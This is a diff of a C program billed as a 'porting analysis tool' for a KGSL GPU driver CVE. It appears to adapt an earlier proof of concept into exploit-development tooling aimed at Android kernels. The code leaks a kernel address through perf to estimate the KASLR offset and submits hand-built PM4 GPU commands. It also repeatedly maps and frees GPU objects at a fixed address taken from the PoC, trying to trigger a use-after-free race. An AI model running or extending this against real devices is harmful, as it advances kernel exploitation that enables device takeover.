@@ -22,7 +22,7 @@
 #include <sys/stat.h>
 #include <time.h>
 
-/* ---------- KGSL ioctl definitions (from original PoC) ---------- */
+/* ---------- KGSL ioctl definitions ---------- */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -74,32 +74,24 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* ---------- テスト用パラメータ ---------- */
-#define TEST_ITERATIONS 10
-#define MAX_ALLOC_SIZE (64 * 1024 * 1024)  // 64MB
-#define MIN_ALLOC_SIZE 4096
+/* ---------- PM4 パリティ計算 (ファイルスコープ) ---------- */
+static uint32_t pm4_parity(uint32_t v) {
+    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
+}
 
+/* CP_TYPE7 マクロ (pm4_parity を使用) */
+#define CP_TYPE7(op, cnt) ( (7<<28) | ((cnt)&0x3FFF) | (pm4_parity(cnt)<<15) | ((op&0x7F)<<16) | (pm4_parity(op)<<23) )
+
+/* ---------- グローバル ---------- */
 static int kgsl_fd = -1;
 static int verbose = 1;
 
-/* ---------- ユーティリティ ---------- */
 static void die(const char *msg) {
     perror(msg);
     exit(1);
 }
 
-static void test_ioctl(int fd, unsigned long cmd, void *arg, const char *name) {
-    int ret = ioctl(fd, cmd, arg);
-    if (ret < 0) {
-        if (verbose)
-            printf("  %s: ioctl ret=%d errno=%d (%s)\n", name, ret, errno, strerror(errno));
-    } else {
-        if (verbose)
-            printf("  %s: ioctl success (ret=%d)\n", name, ret);
-    }
-}
-
-/* ---------- フェーズ0: KASLR / perf テスト ---------- */
+/* ---------- フェーズ0: perf KASLR テスト ---------- */
 static uint64_t test_perf_kaslr(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
@@ -150,11 +142,9 @@ static uint64_t test_perf_kaslr(void) {
     return first_kernel_ip;
 }
 
-/* ---------- フェーズ1: KGSLベーシック操作テスト ---------- */
+/* ---------- フェーズ1: 基本KGSL操作 ---------- */
 static void test_kgsl_basic(void) {
     printf("\n[Phase 1] Basic KGSL operations\n");
-
-    // 1. GPUOBJ_ALLOC with different sizes and flags
     uint64_t sizes[] = {4096, 0x10000, 0x100000, 0x1000000, 0x10000000, 0x20000000};
     uint64_t flags_list[] = {
         0,
@@ -162,7 +152,7 @@ static void test_kgsl_basic(void) {
         KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK,
         KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_UNCACHED,
         KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITECOMBINE,
-        KGSL_CACHEMODE_WRITEBACK,  // no CPU_MAP
+        KGSL_CACHEMODE_WRITEBACK,
     };
     for (int si = 0; si < (int)(sizeof(sizes)/sizeof(sizes[0])); si++) {
         for (int fi = 0; fi < (int)(sizeof(flags_list)/sizeof(flags_list[0])); fi++) {
@@ -176,10 +166,9 @@ static void test_kgsl_basic(void) {
             };
             int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a);
             if (ret == 0) {
-                printf("  ALLOC size=0x%lx flags=0x%lx => id=%u gpuaddr=0x%llx\n",
+                printf("  ALLOC size=0x%lx flags=0x%lx => id=%u mmapsize=0x%llx\n",
                        (unsigned long)sizes[si], (unsigned long)flags_list[fi],
                        a.id, (unsigned long long)a.mmapsize);
-                // Try to get info
                 struct kgsl_gpuobj_info info = { .id = a.id };
                 if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
                     printf("    INFO: gpuaddr=0x%llx flags=0x%llx size=0x%llx va_len=0x%llx va_addr=0x%llx\n",
@@ -189,7 +178,6 @@ static void test_kgsl_basic(void) {
                            (unsigned long long)info.va_len,
                            (unsigned long long)info.va_addr);
                 }
-                // Try to mmap
                 void *map = mmap(NULL, sizes[si], PROT_READ|PROT_WRITE,
                                  MAP_SHARED, kgsl_fd, (off_t)a.id << 12);
                 if (map != MAP_FAILED) {
@@ -198,7 +186,6 @@ static void test_kgsl_basic(void) {
                 } else {
                     printf("    mmap failed: errno=%d\n", errno);
                 }
-                // Free
                 struct kgsl_gpuobj_free f = { .id = a.id };
                 ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
             } else {
@@ -210,10 +197,9 @@ static void test_kgsl_basic(void) {
     }
 }
 
-/* ---------- フェーズ2: GPUOBJ_IMPORT テスト (競合条件の要素) ---------- */
+/* ---------- フェーズ2: IMPORT テスト ---------- */
 static void test_import_race(void) {
-    printf("\n[Phase 2] GPUOBJ_IMPORT tests (potential race)\n");
-    // まず通常のオブジェクトを確保
+    printf("\n[Phase 2] GPUOBJ_IMPORT tests\n");
     struct kgsl_gpuobj_alloc a = { .size = 0x10000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
         printf("  Cannot allocate object for import test\n");
@@ -222,7 +208,6 @@ static void test_import_race(void) {
     unsigned int obj_id = a.id;
     printf("  Allocated obj id=%u\n", obj_id);
 
-    // 複数のimportを試行
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = 0x70000000 };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
@@ -244,7 +229,6 @@ static void test_import_race(void) {
                        (unsigned long long)info.flags,
                        (unsigned long long)info.size);
             }
-            // Free import
             struct kgsl_gpuobj_free f = { .id = imp.id };
             ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
         } else {
@@ -253,7 +237,6 @@ static void test_import_race(void) {
         }
     }
 
-    // free original object
     struct kgsl_gpuobj_free f = { .id = obj_id };
     ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
 }
@@ -261,7 +244,6 @@ static void test_import_race(void) {
 /* ---------- フェーズ3: GPU COMMAND テスト (PM4 命令送信) ---------- */
 static void test_gpu_command(void) {
     printf("\n[Phase 3] GPU command submission (PM4)\n");
-    // Create context
     struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
     if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) < 0) {
         printf("  Context creation failed\n");
@@ -270,7 +252,6 @@ static void test_gpu_command(void) {
     unsigned int ctx_id = ctx.drawctxt_id;
     printf("  Context created id=%u\n", ctx_id);
 
-    // Allocate IB buffer
     struct kgsl_gpuobj_alloc ib_alloc = { .size = 0x1000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) < 0) {
         printf("  IB allocation failed\n");
@@ -288,7 +269,6 @@ static void test_gpu_command(void) {
     uint64_t ib_gpuaddr = ib_info.gpuaddr;
     printf("  IB: id=%u gpuaddr=0x%llx\n", ib_id, (unsigned long long)ib_gpuaddr);
 
-    // Allocate destination buffer for readback
     struct kgsl_gpuobj_alloc dst_alloc = { .size = 0x1000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) < 0) {
         printf("  DST allocation failed\n");
@@ -306,19 +286,8 @@ static void test_gpu_command(void) {
     uint64_t dst_gpuaddr = dst_info.gpuaddr;
     printf("  DST: id=%u gpuaddr=0x%llx\n", dst_id, (unsigned long long)dst_gpuaddr);
 
-    // Build a simple PM4 command: CP_MEM_WRITE to write a known value to dst
     uint32_t *cmd = (uint32_t*)ib_mem;
     int dw = 0;
-    // Helper for type7 packets (copied from original PoC)
-    #define CP_TYPE7(op, cnt) ( (7<<28) | ((cnt)&0x3FFF) | ((((0x9669 >> ((0xF & ((op)^((op)>>4)^((op)>>8)^((op)>>12)^((op)>>16)^((op)>>20)^((op)>>24)^((op)>>28)))) & 1) << 15)) | ((op&0x7F)<<16) | (((0x9669 >> ((0xF & ((cnt)^((cnt)>>4)^((cnt)>>8)^((cnt)>>12)^((cnt)>>16)^((cnt)>>20)^((cnt)>>24)^((cnt)>>28)))) & 1) << 23) )
-    // Simpler: use predefined CP_MEM_WRITE opcode 0x3D with count 4 (addr lo, hi, data lo, hi)
-    // From original: cp_type7(CP_MEM_WRITE, 4)
-    // We'll implement our own cp_type7 macro using parity calculation function (from original)
-    uint32_t pm4_parity(uint32_t v) {
-        return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
-    }
-    #define CP_TYPE7(op, cnt) ( (7<<28) | ((cnt)&0x3FFF) | (pm4_parity(cnt)<<15) | ((op&0x7F)<<16) | (pm4_parity(op)<<23) )
-
     // Write 0xDEADBEEF to dst+0x100
     uint32_t dst_lo = (uint32_t)(dst_gpuaddr + 0x100);
     uint32_t dst_hi = (uint32_t)((dst_gpuaddr + 0x100) >> 32);
@@ -326,12 +295,9 @@ static void test_gpu_command(void) {
     cmd[dw++] = dst_lo;
     cmd[dw++] = dst_hi;
     cmd[dw++] = 0xDEADBEEF;
-    cmd[dw++] = 0x00000000;  // upper 32 bits zero
-
-    // Add NOP to end
+    cmd[dw++] = 0x00000000;
     cmd[dw++] = CP_TYPE7(0x10, 0);  // CP_NOP
 
-    // Submit command
     struct kgsl_command_object obj = {
         .gpuaddr = ib_gpuaddr,
         .size = dw * 4,
@@ -347,7 +313,6 @@ static void test_gpu_command(void) {
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
     if (ret == 0) {
         printf("  GPU command submitted, timestamp=%u\n", gc.timestamp);
-        // Wait for completion
         struct kgsl_cmdstream_readtimestamp_ctxtid ts = {
             .context_id = ctx_id,
             .type = KGSL_TIMESTAMP_RETIRED,
@@ -360,14 +325,12 @@ static void test_gpu_command(void) {
             }
             usleep(100);
         }
-        // Check destination
         uint32_t val = *(volatile uint32_t*)(dst_mem + 0x100);
         printf("  DST[0x100] = 0x%08X %s\n", val, (val == 0xDEADBEEF) ? "OK" : "MISMATCH");
     } else {
         printf("  GPU command failed: errno=%d\n", errno);
     }
 
-    // Cleanup
     munmap(ib_mem, 0x1000);
     munmap(dst_mem, 0x1000);
     struct kgsl_gpuobj_free f;
@@ -375,10 +338,9 @@ static void test_gpu_command(void) {
     f.id = dst_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
 }
 
-/* ---------- フェーズ4: メモリマッピング競合テスト ---------- */
+/* ---------- フェーズ4: mmap race ---------- */
 static void test_mmap_race(void) {
     printf("\n[Phase 4] mmap race / overlap detection\n");
-    // Allocate a large object, free it, then try to map overlapping ranges
     struct kgsl_gpuobj_alloc a = { .size = 0x20000000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
         printf("  Large alloc failed\n");
@@ -387,13 +349,11 @@ static void test_mmap_race(void) {
     unsigned int id = a.id;
     printf("  Allocated large object id=%u size=0x%lx\n", id, (unsigned long)a.size);
 
-    // Get GPU address
     struct kgsl_gpuobj_info info = { .id = id };
     ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
     uint64_t gpuaddr = info.gpuaddr;
     printf("  GPU address: 0x%llx\n", (unsigned long long)gpuaddr);
 
-    // Try to mmap at a fixed address (from original PoC: UAF_ADDR)
     void *target = (void*)0x7001ff000UL;
     void *map = mmap(target, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
     if (map != MAP_FAILED) {
@@ -403,12 +363,10 @@ static void test_mmap_race(void) {
         printf("  mmap at %p failed: errno=%d\n", target, errno);
     }
 
-    // Free the object
     struct kgsl_gpuobj_free f = { .id = id };
     ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
     printf("  Object freed\n");
 
-    // Try to mmap again after free (should fail or return different memory)
     map = mmap(target, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
     if (map != MAP_FAILED) {
         printf("  mmap after free succeeded (unexpected) at %p\n", target);
@@ -417,7 +375,6 @@ static void test_mmap_race(void) {
         printf("  mmap after free failed (expected) errno=%d\n", errno);
     }
 
-    // Try with different offsets
     for (int off = 0; off < 0x1000; off += 0x100) {
         void *addr = (void*)(0x7001ff000UL + off);
         map = mmap(addr, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
@@ -425,7 +382,6 @@ static void test_mmap_race(void) {
             printf("  mmap at %p succeeded after free (offset=0x%x)\n", addr, off);
             munmap(map, 0x1000);
         } else {
-            // if errno == ENODEV, it indicates a conflict (overlap) -> that's the race condition we want
             if (errno == ENODEV) {
                 printf("  mmap at %p got ENODEV (potential race condition)\n", addr);
             }
@@ -433,10 +389,9 @@ static void test_mmap_race(void) {
     }
 }
 
-/* ---------- フェーズ5: ユーザーアドレスインポート（import_useraddr）テスト ---------- */
+/* ---------- フェーズ5: import_useraddr ---------- */
 static void test_import_useraddr(void) {
     printf("\n[Phase 5] GPUOBJ_IMPORT_USERADDR tests\n");
-    // Allocate a page in user space
     void *user_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     if (user_page == MAP_FAILED) {
         printf("  User page mmap failed\n");
@@ -455,18 +410,15 @@ static void test_import_useraddr(void) {
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
     if (ret == 0) {
         printf("  IMPORT_USERADDR success: id=%u\n", imp.id);
-        // Try to map it
         void *gpu_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)imp.id << 12);
         if (gpu_map != MAP_FAILED) {
             printf("  mmap of imported object success at %p\n", gpu_map);
-            // Check contents (should be 0xAA)
             uint8_t first = *(volatile uint8_t*)gpu_map;
             printf("  first byte = 0x%02X %s\n", first, (first == 0xAA) ? "OK" : "MISMATCH");
             munmap(gpu_map, 0x1000);
         } else {
             printf("  mmap of imported object failed: errno=%d\n", errno);
         }
-        // Free import
         struct kgsl_gpuobj_free f = { .id = imp.id };
         ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
     } else {
@@ -475,52 +427,20 @@ static void test_import_useraddr(void) {
     munmap(user_page, 0x1000);
 }
 
-/* ---------- フェーズ6: キャッシュ操作テスト (dc_civac 代替) ---------- */
+/* ---------- フェーズ6: cache ops ---------- */
 static void test_cache_ops(void) {
     printf("\n[Phase 6] Cache operation tests (dc civac)\n");
-    // Test if dc civac is supported
     void *test_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     if (test_page == MAP_FAILED) return;
     __sync_synchronize();
-    // Try to execute dc civac (may cause SIGILL)
-    volatile int result = 0;
-    void (*try_dc)(void*) = (void(*)(void*))0x1000; // dummy
-    // Instead of inline asm, just test if we can use it via signal
-    // We'll just report that it's not tested, but original PoC used it for cache flush.
+    // We test if dc civac instruction is available by trying it with signal handler
+    // For simplicity, just note that it's not implemented.
     printf("  dc_civac test not implemented (assume not available)\n");
     munmap(test_page, 0x1000);
 }
 
-/* ---------- メイン ---------- */
-int main(void) {
-    setbuf(stdout, NULL);
-    printf("=== KGSL Porting Analysis Tool for CVE-33107 on 32-bit GPU ===\n");
-
-    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) {
-        die("open /dev/kgsl-3d0");
-    }
-    printf("Opened kgsl fd=%d\n", kgsl_fd);
-
-    // Phase 0: KASLR detection (perf)
-    printf("\n[Phase 0] KASLR / perf test\n");
-    uint64_t ip = test_perf_kaslr();
-    if (ip != 0) {
-        // Try to compute KASLR offset based on known kernel text base (hardcoded for arm64)
-        uint64_t vmlinux_text = 0xffffffc010080000ULL; // common for arm64
-        uint64_t kaslr = (ip - vmlinux_text) & ~0x1FFFFFULL;
-        printf("  Estimated KASLR offset: 0x%lX\n", (unsigned long)kaslr);
-    }
-
-    // Run tests
-    test_kgsl_basic();
-    test_import_race();
-    test_gpu_command();
-    test_mmap_race();
-    test_import_useraddr();
-    test_cache_ops();
-
-    // Additional: try to trigger ENODEV repeatedly (race condition)
+/* ---------- フェーズ7: ENODEV race trigger ---------- */
+static void test_enodev_race(void) {
     printf("\n[Phase 7] Attempt to trigger ENODEV race\n");
     for (int i = 0; i < 100; i++) {
         void *p = mmap((void*)0x7001ff000UL, 0x1000, PROT_READ|PROT_WRITE,
@@ -535,6 +455,34 @@ int main(void) {
         }
         usleep(10000);
     }
+}
+
+/* ---------- メイン ---------- */
+int main(void) {
+    setbuf(stdout, NULL);
+    printf("=== KGSL Porting Analysis Tool for CVE-33107 on 32-bit GPU ===\n");
+
+    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
+    if (kgsl_fd < 0) {
+        die("open /dev/kgsl-3d0");
+    }
+    printf("Opened kgsl fd=%d\n", kgsl_fd);
+
+    printf("\n[Phase 0] KASLR / perf test\n");
+    uint64_t ip = test_perf_kaslr();
+    if (ip != 0) {
+        uint64_t vmlinux_text = 0xffffffc010080000ULL;
+        uint64_t kaslr = (ip - vmlinux_text) & ~0x1FFFFFULL;
+        printf("  Estimated KASLR offset: 0x%lX\n", (unsigned long)kaslr);
+    }
+
+    test_kgsl_basic();
+    test_import_race();
+    test_gpu_command();
+    test_mmap_race();
+    test_import_useraddr();
+    test_cache_ops();
+    test_enodev_race();
 
     printf("\n=== Analysis complete ===\n");
     close(kgsl_fd);
